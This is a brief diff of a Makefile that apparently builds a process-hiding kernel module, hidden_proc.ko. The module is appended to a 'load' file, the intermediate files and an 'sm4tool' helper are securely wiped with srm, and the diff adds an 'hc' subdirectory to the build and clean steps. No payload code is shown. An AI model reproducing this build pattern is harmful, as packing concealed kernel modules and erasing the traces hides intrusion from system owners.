@@ -15,8 +15,10 @@ default:
 	cat hidden_proc.ko.tmp >> load
 	srm hidden_proc.ko.tmp
 	srm sm4tool
+	make -C hc
 
 clean:
 	rm -rf *.ko *.o *.mod *.mod.o *.mod.c *.symvers \.*.cmd .tmp_versions modules.order
 	rm -rf load sm4tool
+	make -C hc clean
 endif
